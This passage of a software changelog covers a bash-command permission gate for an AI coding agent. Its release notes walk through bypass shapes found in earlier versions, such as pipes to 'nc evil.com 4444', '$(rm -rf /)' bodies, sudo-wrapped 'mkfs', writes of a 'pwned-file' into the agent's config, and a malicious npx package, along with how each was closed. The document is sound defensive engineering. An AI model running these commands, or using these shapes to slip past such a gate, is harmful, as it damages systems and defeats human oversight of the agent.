# Changelog

## 3.40.1 — 2026-10-21
**Prompt coverage is asked at the tier the prompt needs: a READ grant never
covers a WRITE prompt.**

- **What the operator saw.** An `edit ~/.local/bin/llama-unload-all` prompt
  (cwd `/mnt/Ndr/Projects`) offered `Always (broader): Edit ~/.local/*` and no
  way to grant the file's own directory: the `Always (path): …/.local/bin/*`
  and `Always (file): Edit llama-unload-all` tiers were simply absent, so the
  only one-click dir grant on the table was one level UP from the target.
- **Why.** `ui/prompt-flow.ts` built the coverage predicate on the store's READ
  tier — `isInsideAllowedDir(dir, "read")`, which answers from readDirs *and*
  writeDirs — and `buildFilePrompt` used it for the `*Covered` flags and the
  umbrella filter alike. The session was holding a READ grant for
  `~/.local/bin` (an `Always (paths)` click on an earlier bash prompt over that
  same dir is the shape that mints one), so the builder called the write
  prompt's dir and file tiers "covered" and suppressed both — while
  `decide/file-policy.ts` had prompted for exactly the opposite reason: that
  dir carries no WRITE grant. The suppression claim and the bar it is supposed
  to reflect disagreed, and the surviving option grants more than the
  operation asked for.
- **The fix.** The predicate now takes the tier — `(dir, kind) =>
  store.isInsideAllowedDir(dir, kind)` — and `buildFilePrompt` asks it at
  `isWriteOp ? "write" : "read"`, the same question `decideFile` asks of the
  same path. The tier lives in the builder that knows the op kind, not in the
  flow. Read prompts keep their suppression behavior; grant *matching* is
  untouched, only which Always options are offered.
- Repro pinned by three tests in `test/prompt-builder.test.ts` (read grant +
  write prompt → dir/file tiers stay offered; write grant → suppressed; read
  grant + read prompt → suppressed), driven by a real `createStore()` so the
  store's tier semantics are part of the assertion. Suite 4293 passed, 1
  skipped / 57 files (3.40.0: 4290 / 1).
- **Dropped the live-wire probe** — `test/live-judge-wire.test.ts`, the suite's
  one skipped test. It was the A/B instrument behind 3.40.0's `toolChoice`
  fix, and its verdict is already recorded there: 7 samples per arm, tool call
  7/7 in both, forced arm +10 prompt tokens, so the guard was adopted as a
  structural one, not a measured repair. Re-running it needs a live model and a
  crash-dump corpus under `/mnt/Ndr`, which no CI of this repo will ever have —
  it could never fail a build, only hold a skip line. `judge/judge.ts` keeps the
  finding in its own comment, with the CHANGELOG as the pointer. Suite after the
  removal: 4293 passed, 0 skipped / 56 files.

## 3.40.0 — 2026-10-20
**A floor stop is either a BAR or an unknown. The bars stay absolute — the
irreversible patterns, egress, credential paths, delete reach, any write
outside the write bar; what goes to judgment is a location the parse could
not name.**

- **The judge tells the wire the verdict call is mandatory — in that wire's own
  vocabulary.** The six 2026-10-17 `no-tool-call` stage-2 lines were replies
  that opened no call at all: the verdict schema written out as prose-ish JSON
  (`{"explanation": …`) with the arguments and no `name`, each one a lost
  explanation and a fail-safe defer. `judge()` and the path resolver both sent
  `toolChoice: "auto"`, on the theory that it was the only portable value.
- **Why one value could not work.** pi types `ToolChoice` as `auto | none`, so what
  reaches an adapter is unvalidated, and each adapter reads the string differently:
  `openai-completions` forwards `tool_choice` verbatim and `mistral-conversations`
  accepts `required`, but `anthropic-messages` wraps the string as `{type: "required"}`
  (not an Anthropic value — a 400, i.e. a judge that defers forever), and
  `google-shared` / `bedrock-converse-stream` map only `auto`/`any`/`tool` and would
  silently drop `required`. So the request is now spelled per wire:
  `TOOL_CHOICE_BY_API` + `judgeToolChoice()` → `required` for the five OpenAI-shaped
  wires and Mistral, `any` for Anthropic, Bedrock, Google Generative AI and Vertex,
  `auto` for an api the map does not name. Both judge stages and the path resolver
  use it; the stale portability comment is gone.
- **What it buys, and what it does not.** Requiring the call removes the
  prose-reply class at the source — a wire that writes the call opener cannot emit
  that shape. It does not touch the class still live at temperature 1: a call that
  opens and immediately closes with empty arguments (`bad-args`), which the retry
  covers.
- **No before/after improvement was measurable.** `test/live-judge-wire.test.ts`
  (env-gated, skipped by default — `HALTER_LIVE_WIRE=1 HALTER_LIVE_WIRE_N=7
  ../node_modules/.bin/vitest run test/live-judge-wire.test.ts`) replays a real
  2026-10-17 stage-2 packet through the real `judge()` and pi's real `stream` seam
  on the live engine: 7 samples at `auto` and 7 at `required` produced a tool call
  7/7 in both arms, so the collapse did not reproduce on today's engine. The same
  empty-args flake appeared 1/7 in *both* arms (absorbed by the retry). The force
  itself is proven structurally, not behaviourally: the forced arm pays +10 prompt
  tokens for the same packet (in=17 cache=1899 vs in=7 cache=1899), and a direct
  request to the same engine with the same prompt answers "Hello" in prose at
  `auto` but returns a real `tool_call` at `required` and `any`. The Oct-17 state
  cannot be pinned — the served quant file post-dates the failures — so this is
  recorded as a structural guard, not a measured repair.

- **The floor never asked the write question of its own operands
  (`gate/dspa-gate.ts`; step 1 of `docs/dspa-intent-floor.md`, D-d).**
  `analysis.writePaths` — every write-role operand the parser mints — was checked
  only against the READ bar, and the manual read bar admits dirs that carry no
  write grant (`~/.pi` is read-allowed so skills and extensions load). Six verbs
  into pi's own config dir auto-allowed under /dspa at HEAD: `touch
  ~/.pi/agent/pwned-file`, `mkdir …/pwned-dir`, `cp notes.md …/notes.md`, `mv`,
  `tee … <<<x`, `truncate -s 0 …`; each now stops, naming the dir on
  `writeOutside` so the prompt's `Allow writes` tier clears it in one click, and
  a READ grant for that dir no longer satisfies the write. Manual mode has asked
  this question since G3 (`outsideWriteDirs` / `needsWriteApproval`,
  decide/bash-rules.ts); the floor was the half that never did, which left pi's
  settings file guarded only by the accidental `sed -i` dangerous pattern.
- **Measured on the live ledger: no verdict changes.** All 520 bash rows of
  `.log/decisions.jsonl` (2026-10-18) replayed through `checkDspaGate` at HEAD and
  at this commit: 0 stop→allow, 0 allow→stop; 2 stopped rows gained the compound
  `…; writes <dir>` reason (D21 merged options — the write grant is now offered on
  stops that used to be read-shaped). Eight rows carry an operand outside the
  write bar and all eight already stopped for another reason (usually D18's
  base-write proxy over an opaque body); the six bypass commands above are the
  evidence the gap was open, not the corpus.
- **The dangerous tables split into absolute bars and class names
  (`config/dangerous-patterns.ts`, `analysis/segment-analysis.ts`,
  `gate/dspa-gate.ts`; step 2a of `docs/dspa-intent-floor.md`, D-b).** Every
  entry in `dangerous:` names a CLASS, but the gate had treated the set as one
  policy: only the rm branch stopped on it, everywhere else it was already
  judgeable (D1). Nine entries are now flagged `absolute: true` — `mkfs`,
  `mount`, `shutdown`/`reboot`, `eval`, `dd if=/of=`, `git push --force`, `git
  reset --hard`, `git clean -<fdx>`, download-and-execute — the analysis tags
  their hits `[Absolute] <label>`, and the gate stops on that tag
  (`absolute bar (…)`, advisory, both judge stages still run). Matching the
  analysis's own reason instead of re-matching the table in the gate is what
  keeps the analysis's exclusions: `grep "curl | bash" notes.md` and `echo 'git
  reset --hard'` stay judged. The rest — interpreters, `sed -i`/`perl -i`,
  package managers, `kill`, `tar`/`cp`/`mv`, `truncate` — are names, and the rm
  carve-out no longer stops on a bare class label next to an rm (an evaluator
  reason like `[Tool] tar` still does).
- **Three defects the D-b probe turned up, all pre-existing.** `git clean`'s
  pattern `\bgit\s+clean\s+.*-[fdx]\b` never matched the common `-fdx` (after
  `-f` the following `d` breaks the word boundary and there is no second dash to
  retry), so that label was dead for the dominant form; the replacement hits
  `-fdx`, `-xdf`, `-e x -fd` and skips `-n`, `-nd`, `--dry-run`. `sudo` was not
  in the analysis vocabulary at all — neither a wrapper nor a prefix — so the whole
  pattern table was blind behind it and `sudo mkfs.ext4 /dev/sdc` was JUDGEABLE;
  it is now a pass-through wrapper (`wrapperCommands` + sudo's value flags), so
  `sudo git clean -fdx`, `sudo timeout 5 dd if=…` and a sudo'd write into
  `~/.pi` face the same bars as the bare forms (operator's caveat: a
  non-interactive `sudo` usually dies on the missing password, so the live
  shapes are NOPASSWD rules and cached credentials). And the download-and-execute
  bar, applied blindly, stopped two real rows of `curl -s localhost:8080/v1/status
  | python3 -c 'json.load(…)'` — a local API answer being parsed. The bar is
  about REMOTE code, so it now defers to the egress check's fail-closed
  `isLoopbackEgress`: a stated loopback host is judged, `"$API/…"` still fails
  closed.
- **Measured (step 2a).** 520-row ledger replay against the pre-change baseline:
  0 allow→stop, 0 stop→allow, 0 new friction from the loopback exemption. The
  corpus holds no `mkfs`/`eval`/`git reset --hard` row, so the probe table — not
  the ledger — is the evidence for the newly-stopped classes: at the pre-change
  HEAD `mkfs.ext4 /dev/sdb`, `shutdown -h now`, `eval "$CMD"`, `git reset --hard
  HEAD~3` and `sudo mkfs.ext4 /dev/sdc` reached the judge unprompted.
- **The egress bar now asks what the wire is used for, not where it goes
  (`gate/dspa-gate.ts`, `config/bash-patterns.ts`, `analysis/write-roles.ts`;
  step 2b of `docs/dspa-intent-floor.md`, D-a).** `network egress (…)` had
  stopped every remote call, so `git fetch`, `curl localhost:8080/v1/status` and
  an exfil POST shared one absolute bar, with provably-loopback as the single
  judged escape hatch. Each segment is now classified: **fetch** (`git
  fetch`/`pull`/`ls-remote`, curl/wget with no outbound body, form, upload file,
  cookie or user and no mutating method) is JUDGEABLE — nothing local leaves the
  machine, and a download's landing file is minted as a write operand (`curl -o`,
  `wget -O`) so it faces the write bar (D-g/D-d). **Upload** (a curl body/form/
  `-T`/`-b`/`-u`, `-X POST|PUT|DELETE`, `scp`/`sftp`/`ftp`/`rsync`, `git push`) and
  **opaque** (`ssh`/`nc`, the container and cloud CLIs, package installs, `git
  clone`, an unknown command taking a URL) stay ABSOLUTE: whether what goes out
  is a secret is not verifiable from the command text, so intent cannot stand in
  for the user's call. D-i keeps the fetch half honest — the premise needs a
  destination the parse can READ, so a proxy value, a `socks5://`/`ftp://` form,
  a `$HOST` URL, or no destination stated at all falls to opaque, which is what
  preserves D14's fail-closed corpus (its loopback exemption is unchanged and
  still applies to both kinds).
- **The URL catch-all covers only commands outside the vocabulary.** Inside the
  read-only and closed-subcommand sets a URL literal is data, so `grep -rn
  'http://example.com' docs/`, `sed -i 's|http://a|http://b|'`, `git log
  --grep='http://x'` and a heredoc writing docs that quote a curl example are
  judged, while `my-tool --endpoint https://evil.example/x` still stops — naming
  the offending non-loopback URL rather than the first one in the text. The other
  false-stop class was tokenization: a whitespace split made `-H 'content-type:
  application/json'` mint the bare target `application/json`, so the destination
  parse is quote-aware now.
- **Measured (step 2b).** 520-row ledger replay against the pre-change baseline:
  egress stops 10 → 5, 1 stop→allow (`git fetch`), 0 allow→stop. The 5 removed
  were 2 `git fetch` rows and 3 curl rows whose "destination" was a header value
  (those 3 still stop on their own outside-base reason). Of the 5 left, 3 × `git
  push` is correct; 1 is a false stop that the split does not clear (a
  `python3 - <<'EOF'` fixture edit whose heredoc BODY contains
  `http://remote:9999/` — filed as a known gap), and 1 is a replay artifact: the
  ledger caps `target` at 1000 characters, which cuts a heredoc mid-body and
  turns its body lines into segments, so the complete row judges clean (that cap,
  not a defect, made the old `network egress (uv)` line). The catch-all
  narrowing's own FP class (`grep -r 'http://'`, `sed -i 's|http://…|…|'`, `git
  log --grep='http://'`, a doc heredoc quoting a curl example) is
  probe-evidenced, not ledger-evidenced — no such row occurs in these 520. Suite:
  4257 passed, 1 skipped.

- **The rm bar stopped on syntax, so a bounded delete became a prompt
  (`analysis/delete-scale.ts`, `analysis/command-analysis.ts`,
  `gate/dspa-gate.ts`; step 3 of `docs/dspa-intent-floor.md`, D-c).** The
  carve-out stopped any target the floor could not name as one concrete path —
  `rm -rf *`, `rm -r build/*`, `rm -f wp90023543_*.jpg` — including patterns that
  expand to a handful of files the agent just wrote. A glob is not a shape to
  refuse, it is a reach to measure. The new module answers two questions per
  STAGE, under the base that stage runs in (`cd out && rm -rf *` counts `out`):
  **provenance** — a target the floor cannot locate (a variable, a substitution,
  a quoted `~`, a relative operand under a base the parse lost) and a delete
  whose targets the shell supplies (`find -delete`, `find -exec/-ok rm`,
  `xargs rm`, `truncate *`) are absolute; **reach** — a capped glob/walk count
  (`DELETE_WALK_CAP` = 4096, reported as `N+`) with the ceiling on aggregate
  reach outside `allowedWritePaths` (`DELETE_SCALE_ABSOLUTE` = 50, the strict
  temp zone). A bounded delete inside the bars is judged and its count rides the
  judge's risk line (`deletes 124 files, recursive`) instead of stopping.
- **The location rules apply outside the temp zone only.** Deleting the working
  directory itself, a target escaping above it, and a top-level filesystem dir
  (`/`, `/mnt`, `/home`) stay absolute there; inside the zone the strict-zone
  decision makes the reach informational whatever the shape, so `rm -rf /tmp`
  judges as D11 always ruled and `rm -f /tmp/*` judges with its count in the
  packet (probe: `cd /tmp/x && rm -rf ..` judges, note `deletes 1607 files,
  recursive`). Two bars had to learn that a glob's root is not its target: the
  self-delete bar (the shell never expands `*` to `.`) and the root-level bar (a
  pattern is root-level only when rooted at `/`). No double mass-bar either:
  `system-evaluator`'s mass-deletion notes were already filtered in the rm
  branch, so the count is the only mass bar on rm-shaped commands.
- **Four shapes the first probe got wrong, fixed in the same commit.** A glob
  rooted at the cwd read as "the working directory itself"; reach counted the
  glob's static root instead of the absolute pattern, so `rm logs/*.log`
  (60 matches) counted 1 and judged; pipeline stages were never scanned
  (`segments` is not `|`-split — `stageTexts` is); and `xargs rm` stayed
  invisible because wrapper delegation resolves it to a bare `rm`, so the mass
  rule now keys on the typed first word plus the operative verb (`xargs -0 ls`
  stays out). Self-delete is checked before escaping and root-level, so
  `rm -rf ..` names the escape and `rm -rf ../work` names the self-delete; the
  stop reason names the number that triggered it (outside-temp reach) while the
  packet note names the total.
- **Measured (step 3).** 520-row ledger replay back-to-back against HEAD: 1
  stop→allow (`cd /tmp && rm -f wp90023543_*.jpg && magick …` — the corpus's
  only rm-explicitness stop), 0 allow→stop, no other reason change. Suite: 4264
  passed, 1 skipped (+7 D-c cases). Replaying against a baseline captured hours
  earlier instead showed a bogus flip and 5 bogus reason changes: the analysis
  reads the live filesystem, so a same-fs-state A/B is the only honest
  comparison — filed in the spec's replay gotchas.
- **A stop that only says "I cannot name this location" is now typed, and goes
  to the intent pass to be named (`gate/dspa-gate.ts`, `gate/fallthrough.ts`,
  `gate/decision-log.ts`; step 4 of `docs/dspa-intent-floor.md`, D-g/D-h).**
  Every stop the floor reaches because it cannot locate something — an unbound
  var, an opaque script body's base, the D18 base-write proxy — used to be
  indistinguishable from an absolute stop in `DspaGateResult`, so the judge was
  consulted only to decorate the prompt. The stop variant now carries
  `misses?: MissFact[]` (`kind: unresolved | outside-path | base-write`, the
  `token`, the `prefix` a report must answer with, and whether the parse put it
  in a WRITE position), and `tryIntentOverMiss` asks stage 2 the one question
  the floor cannot answer. Stage 1 is skipped there — it is eval-locked out of
  path reports, so it cannot name a location (D22's skip, inverted); the single
  stage-2 call replaces the stage-1 call these rows used to spend. Three guards
  decide whether a verdict may clear the stop (`intentGuardFaults`, §4): a
  WRITE-role fact never rides a miss, the report must name the location itself
  (an empty report clears nothing, which is what makes D-h's "not the `writes:
  []` variant" fall out for free), and a credential class stays absolute —
  `~/.ssh`, `~/.aws`, and the pseudo-fs secrets `/proc/<pid>/environ` the static
  name rules cannot see. The judge's fresh `writes` report faces the manual
  write bar before any of that, so an out-of-bar write still produces the same
  `write outside base (…)` stop and the same `Allow writes` grant (D-g). The
  write-bar block moved above the D7 sentinel pass so its stop carries the
  grant offer too and the fact builders see one `writeOutside`.
- **What stays a stop.** A miss is the WHOLE stop: one concrete out-of-bar write
  operand or one location with no static anchor removes the `misses` field, so
  `cd "$d" && …` (nothing to answer with) and `echo hi > ~/out/file.txt` never
  reach intent. Absolute classes are untouched (D-a/D-b/D-c).
- **The ledger grew the mining rows (§7).** `unresolved.jsonl` gains
  `outcome: "intent-allowed" | "intent-declined"` plus `missKind` and `guard`
  (what decided: the guard fault, the verdict, the write bar, or no verdict).
  The judge ledger's `paths` line stays reserved for misses that actually ran
  through the floor, so the parser-gap probe does not fill with stops.
- **Measured (step 4).** 520-row ledger replay back-to-back against HEAD: **0
  flips, 0 reason changes** — the floor decides exactly as before; `misses` is
  metadata. Of its 310 stops, **273 are now miss stops** (256 outside-path
  reads, 15 with a base-write proxy, 2 with an unresolved fact); of those, 269
  would clear on a cooperative approve/low verdict and 4 cannot (the pseudo-fs
  credential ceiling). The reduction itself is a live-rate question, not a
  replay one: step 5's `judgePaths`/`confirmedPrior` fields are what measure it.
  Suite: 4285 passed, 1 skipped (+21 in the new `test/intent-floor.test.ts`).

- **The ledger reports what decided, and the judge's report stops lying about
  it.**

- **A URL is not a location (§4.5).** `sanitizeJudgePaths` resolved the model's
  `http://127.0.0.1:8080` against the operation's cwd into
  `<cwd>/http:/127.0.0.1:8080` (realpath collapses the `//`) — a fake path under
  the operation's own base, which cwd coverage then swallowed in the D13
  diagnostic. Since step 4 that garbage is worse than a bogus line: it also
  satisfies §4.2 for any miss whose static prefix is an ancestor of the cwd, so
  `cat /Users/u/$V/data` (prefix `/Users/u`) with that report auto-allowed — a
  report defect clearing a stop. Scheme-shaped tokens are now dropped at the one
  choke point every consumer shares: ledger, write bar, §4.2.
- **The mismatch's cause is honest (§4.4).** With no concrete path of its own the
  floor cannot have been out-of-date about a location it never derived, so
  `judgePathReport` no longer splits such a miss into `contextMisses`; it stays a
  `floorMiss`, which is where a parser gap is found.
- **An intent row carries the evidence the decision turned on (§7).**
  `judgePaths` — the §4.2 match set for THAT token, i.e. what the judge claimed
  the unknown location IS (omitted when nothing answered it: that is a decline,
  and `guard` says so); `confirmedPrior` — a confirmed resolution already covered
  the location, the operator having vouched for this place before intent was
  asked (`persisted` is the other half: a confirmation stored by THIS run, which
  an intent row never has). `MissFact` gained `confirmedPrior` because the gate is
  the only place that holds the confirmed state at the moment of the stop, and one
  sanitized report per attempt feeds guard and rows alike, so a row cannot
  disagree with the decision it records.
- **A step-4 defect: the judge ledger wrote the same `paths` line twice** for an
  intent allow — `tryIntentOverMiss` called `logJudgePaths` and `dspaAutoAllowed`'s
  stage-2 pass called it too, double-counting every intent allow in
  `log-inspect dspa --paths`. Step 4's assertion was
  `.some(l => l.kind === "paths")`, which holds at one line and at two, so it
  passed; the redundant call is gone and the test asserts the count is 1.
- **Measured (step 5).** 520-row replay back-to-back against HEAD: **0 flips, 0
  reason changes** — nothing here moves the gate's decision, only what is
  recorded behind it. The ledgers carry the effect: of 51 `judge.jsonl` `paths`
  rows, 1 holds the mangled URL (2026-10-18T14:17:23) and 6 carry
  `contextMisses` on a row with no concrete floor path — 6/51 rows §4.4 moves from
  context bleed to floorMiss, 5 of them `npx vitest`/`tsc` runs where the judge
  named the project dir and the floor named nothing (the gap that was hidden).
  7 of 37 `unresolved.jsonl` `gate-stop` rows had a confirmed resolution in
  effect: the population `confirmedPrior` separates. Suite: 4290 passed,
  1 skipped (+5).

## 3.39.0 — 2026-10-17
**The bar asks about the thing the command actually touches: the binary, the
written operand, the fetched package.**

- **What was wrong — three name-based shortcuts, one class.** (1) `argv0` was a
  *name*: `bin/ls`, `scripts/cat README.md`, `~/Downloads/ls`,
  `/tmp/evil/git status`, `node_modules/.bin/tsc` matched the allow table by
  basename while the parser minted no path for the program the shell execs — and
  the base-bound grant rule (`RELATIVE_PATH_RE`, `./` and `../` only) never saw
  `bin/ls` either. (2) The manual path asked ONE location question, *may this be
  READ?*: `~/.pi` is an `allowedReadPath` (skills, extensions), so
  `mkdir ~/.pi/agent/pwned-dir` and `touch ~/.pi/agent/pwned-file` auto-allowed.
  (3) A run form's answer to *what does this FETCH?* was the first word after the
  flags, and its options were three hand-written lists that had already drifted:
  `npx --package=evil-pkg tsc` (fetches `evil-pkg`, runs `tsc` from inside it)
  was vouched for by Trust for `tsc`, a package it never fetched; `uv run --color
  never <skills script>` read `never` as the payload and lost the trusted-script
  umbrella; `uv run -P pandas <skills script>` folded `-P`
  (`--upgrade-package`) into `-p` (`--python`) and auto-allowed an install.
- **The fix — `argv0` (`analysis/argv0-path.ts`).** A program is classified bare
  / system (the four distro-owned dirs) / path-qualified, per stage against that
  segment's effective base, computed once so parser, grants, prompt and floor
  agree. Qualified means the program's own location joins the path set, it
  matches only an exact base-bound grant, and the signature names the path
  instead of collapsing it. `command -v /tmp/x` keeps bare-name semantics — a
  lookup runs nothing; `/usr/local/bin` and `/opt/homebrew/bin` are deliberately
  NOT system dirs (admin/homebrew-writable is the class).
- **The fix — write roles (`analysis/write-roles.ts`).** A closed table of
  operand ROLES (`WRITE_ALL` / `WRITE_LAST` / `WRITE_FIRST` / `WRITE_IN_PLACE` —
  the verb decides which position is the destination) plus per-command flag
  tables for destinations that hide in flags (`tar -f`/`--file`, `cp -t`,
  `sort -o`, `dd of=`, `find -fprint`), the flag-that-switches-the-verb form
  (`find -delete` ⇒ every walked directory), and tar's extract/create asymmetry.
  `writePaths ⊆ paths` by construction — minted at the same sites, same filters,
  one resolution path. The decision layer bars write operands against cwd ∪
  `allowedWritePaths` ∪ the session's WRITE grants — a READ grant never
  satisfies one — and the prompt titles `Write` so the Always tier stores
  `writeDirs`, the click that covers the next run. Closed world: no table entry
  ⇒ no write operand claimed.
- **The fix — the runner's closed world (`config/bash-patterns.ts`,
  `config/trusted-scripts.ts`).** `fetchFormScan` names EVERY package a form
  selects (`FETCH_PKG_SELECT` per family: npm `{-p,--package}`, uv `{--from}`
  only — uv's `-p` is `--python` — bun `{--package}` long form), and with a
  select flag the trailing word is the command run from inside the selected
  package(s): `npx -p typescript tsc` fetches `typescript` alone. uv's four run
  forms (`uvx`, `uv x`, `uv tool run`, `uv run`) share one option model over
  `UV_VALUE_FLAGS` — the arity table generated from uv's own `--help` (83
  options, 49 value-taking) — and it has three consumers: the fetch scan,
  `findScriptOperand` and uv's own walk, so a flag's value can never be read as
  the payload by one of them. Curated classes: flags that cannot change what
  runs, benign value flags, and the dep flags that face package trust;
  everything else, including anything the table does not know (an unknown option
  is ASSUMED to take a value, so the scan can only narrow), voids the umbrella —
  unknown is never benign. Option values that decide what runs join the grant
  identity (`uvx --python /tmp/evil/python`, `timeout uv run --with pandas`),
  and a value the shell has not named yet (`-p "$PKG"`) makes the form
  ungrantable rather than silently coarse — the prompt says so.
- **Found on the way and pinned.** G3: tar's dashless bundle (`tar cf out.tar`)
  claimed no archive; `patch f` named no target; `cp -t DIR a b` claimed `b` as
  the destination; `skipArgs` was ignored on flag VALUES (`-name x` became a
  location); `>|` (noclobber) was not a write redirect; `sort -o` reached
  `allWrites` twice; and the body-write fold placed AFTER the
  `SAFE_SYSTEM_PATHS` dedup dropped those writes silently. G7: `uv tool run` —
  the two-word `uvx` — was never fetch-scanned at all, and the floor's stop for
  `uvx -p /tmp/evil/python tsc` named the python path as a *package*; it now
  reads `unvetted run-form option (uvx)`.
- **Measured.** Round-6 reproducer corpus (62 rows): 12 open at 3.38.0 → 6 after
  G4 → 4 after G3 → **3** now; the three left are G8 (variable shadowing). The
  31-row location-floor set: 7 stops → **8**, the new stop being
  `npx --package=evil-pkg tsc` — the hole itself. A frozen replay of 875 unique
  real logged commands through `decide()` shows **zero** verdict differences
  3.38.0 → 3.39.0 (the replay carries no grants, so it cannot show the
  signature-text cost below; 149 of its rows are `npx …` forms and none flip).
- **Upgrade note (fail closed, one re-prompt).** Pre-3.39.0 grants for uv/uvx
  forms that carry options change text: `uvx -p`, `uvx --from`, a coarse
  `uv run`/`uvx` grant in front of an option-valued form, and wrapped
  `timeout uv run --with …` all re-prompt once. A path-qualified program never
  matches a basename grant (`ls` does not cover `bin/ls`), and a READ grant
  never covers a write outside the bar.
- **Known boundaries, documented not fixed.** A `SHELL_INTERPRETERS` body
  (`sh -c 'echo > ~/.pi/agent/x'`) mints no paths at all, so neither bar sees it
  — its command-level grant gates it (`sh`/`bash` are not table-allowed) and
  under `/dspa` the judge sees the full text. npm-family options beyond the
  select flags are not vetted by name — but their values land in the fetch set,
  so the command names a package no Trust can hold and prompts (`npx --registry
  http://evil.invalid tsc`). And a coarse fetch-form rule still covers
  npm-family variants: an "Always" on `npx tsc --noEmit` stores `npx tsc`, which
  prefix-covers `npx --package=evil-pkg tsc` (measured) — deferred as G13, and
  closed for `uvx` by the signature change.
- Suite 4237 / 55 files.

## 3.38.0 — 2026-10-17
**The stage, not the segment, is what gets approved.**

- **What was wrong.** A pipeline and everything inside it was ONE approval unit,
  and every rule that asked *what does this segment run* answered separately.
  Four shapes, all verified against the running gate at 3.37.1: (1) the segment
  signature stood for the whole pipe, so `Always` on `ls | nc evil.com 4444`
  granted the head and `true | nc evil.com 4444` auto-allowed; (2) base access
  was scanned at stage 0 only, so `cd /etc && true | cat passwd` never saw
  `/etc/passwd`; (3) a `$(…)` body was classified by NAME over its text
  (`READONLY_SUBSHELL_CMDS`) — blind to flags (`fd -x rm`), to relative operands
  (`cat .env`), to a `cd` inside the body — and the body extractor took the
  node's FIRST child, so `$(ls & rm -rf /)` read as `ls`, and
  `echo "$(cat .env)"` auto-allowed while `cat .env` prompted; (4)
  `nice command cat /etc/hosts` named `nice` — not path-aware, so the operand
  model never ran, `paths=[]`, no location bar existed at all.
- **The fix — stages.** `BashSegment.stages` comes from the pipeline AST, not a
  text split (quoting and `$( )` nesting cannot fake a stage boundary);
  `SafetyRule` approves per stage and binds relative paths, delegation and
  fetch-package trust to the stage that owns them; run-dep and ungrantable
  refusals stay segment-level (refuse the whole pipe). `baseAccessPath` /
  `baseWriteAccess` scan EVERY stage — a pipeline shares one effective cwd —
  while the `saw*` suppression flags stay segment-wide (D20).
- **The fix — bodies.** A `$(…)`, backtick or `<()` body is re-parsed and its
  segments run the pipeline a top-level segment runs, under the parent's
  effective base: paths join the command's set, programs extend the parent's
  STAGE list (a body program needs its own grant; `Always` on the outer program
  never vouches for it), a body's own `cd` re-bases only the body, nesting is
  depth-capped and fails closed, and each body gets its own credential pass.
  The name table is deleted; what it encoded is re-expressed behaviourally — a
  body's verdict is the verdict of the same command run directly.
- **The fix — the command position.** `analysis/wrapper-unwrap.ts` is the single
  answer to *what runs here*: prefixes and pass-through wrappers
  (`timeout`/`nice`/`env`/`command`/`xargs`/…) iterate to a fixpoint, and past
  `MAX_UNWRAP_HOPS` the third state `capped` replaces the fallback to the first
  word — the first word of a wrapped chain names no program and silently skips
  the operand model, so "fall back" **is** the hole. Past the cap the parser
  marks the position obscured, the signature collapses to the wrapper alone (no
  grant can name it), and the base checks assume the base is touched. `lookup`
  (`command -v x`) keeps the head word: it runs nothing.
- **Payloads trust less.** `find -exec`, `fd -x`, `rg --pre` and shell bodies now
  accept a verb only from `unconditionallySafeCommands`. An entry with an
  exclusion reason (`git`, `grep`, `sort`) is allowed BY the segment-level
  vetting (egress, dangerous flags, delegation) that never runs on a payload
  inside someone else's segment — `find . -exec git push \;` was approved twice
  over and vetted zero times; `fd -x git clean -fdx` likewise. Cost accepted:
  payload `grep` now prompts — `grep`'s reason is a hedge, not a capability.
- **Two false prompts found on the way.** An escaped separator is data: the split
  predicate fed the `|` of `grep a\|b f` to the splitter, the text fallback
  re-split the segment and minted a stage named `b` that no grant could cover
  (a prompt on every such command, once grants went per-stage). And `uv run -w
  evil-pkg <trusted script>`: `-w` IS `--with` (`uv run --help`), and an unknown
  option is assumed to TAKE a value, so the dependency was never recorded, the
  signature stayed coarse, and the install rode the trusted-script umbrella.
- **Measured.** Round-6 reproducer corpus (62 rows, 37 auto-allowed at 3.37.1):
  32 after the stage fix → 28 after per-stage base access → 21 after bodies →
  **12** now; the 12 map to G4 (6 `argv0`), G3 (2 write-bar), G8 (3 variable
  shadowing), G7 (1 `uv run --project`). The 31-row location-floor set gained 6
  stops and lost none (`nice cat /etc/hosts`, `command cat /etc/hosts`, `env cat
  /etc/hosts`, `echo $(cat /etc/passwd)`, `echo $(rm -rf /)`, `nice command ssh
  user@evil.com`). A frozen replay of 830 real logged commands through `decide()`
  shows **zero** verdict differences 3.37.1 → 3.38.0; one row
  (`git ls-files | xargs grep -l -e '/mnt/Ndr'`) prompted at an intermediate
  revision and auto-allows at both ends — the arg-index scanner read the
  `grep` PATTERN as a file operand and stopped on a phantom outside path, and G6
  removed that reading.
- **Replay corpus (G12):** the round-1–5 ledger is gone and the live
  `decisionLog` toggle is ON, so the corpus rebuilds from this release; the
  compile-time default stays off so a fresh install logs nothing by default.
- Suite 4170 / 52 files.

## 3.37.1 — 2026-10-16
**A redirect inside a quoted shell payload is still a redirect.**

- **What was wrong.** Step 1 made `sh -c '…'` decide write-ness from its body's
  stage verbs, and `echo x > .bashrc` has no write verb — `echo` is on the
  auto-allow table. The whole payload is ONE token to the outer-command
  redirect scan (D18 rule 1), so `cd <base outside the write bar> && sh -c
  'echo x > .bashrc'` **passed the floor outright**. It surfaced as control W8
  of the step-2 replay (51 unique location-floor ledger prompts + 13 adversarial
  controls, 64 rows, through the live judge): floor PASS, and the only reason
  the command ever prompted was that the judge happened to deny it (medium).
- **The fix.** `shellBodyWrites` checks the body's own output redirects first,
  with the same exclusions as rule 1: fd operations (`>&2`, `>&-`) and absolute
  targets (already in the path set) are not writes; a relative target, an
  expansion (`> $out`) or a truncated body counts — fail-closed. Those
  non-writing redirects are then stripped before the verb scan, because
  splitting on `&` left a stray `2` stage from `>&2` — an unmodeled verb, which
  fail-closes and would have turned every `cmd 2>&1` payload into a write.
- **No over-stop.** `sh -c 'ls | wc -l'`, `bash -c 'grep -c x notes.txt
  2>/dev/null'` and `sh -c 'cat a.txt | sort | uniq -c | sort -rn | head'` still
  pass the floor; no location-floor ledger row gained a write claim from this
  rule. The 6 rows that now carry `write outside base` are all real writes
  (`cat > test/…`, `cat >> test/…`, `open(p,'w').write(…)`), checked by hand.
- Suite 4051 / 51 files.

## 3.37.0 — 2026-10-16
**An inline program is a write only when its own body says so.**

- **What was wrong.** D18's trigger class (2) was literally
  `hasHeredoc || hasInlineFlag`: any interpreter fed by a heredoc or a
  `-c`/`-e` payload under a re-based base was declared a WRITE, whatever the
  code did. `cd ~/Strata && python3 -c "json.load(open('strata-iq3_s.json'))"`
  — a read — was reported as `write outside base (…/Strata)`, and its
  fall-through prompt offered a session **WRITE** grant (`writeOutside` →
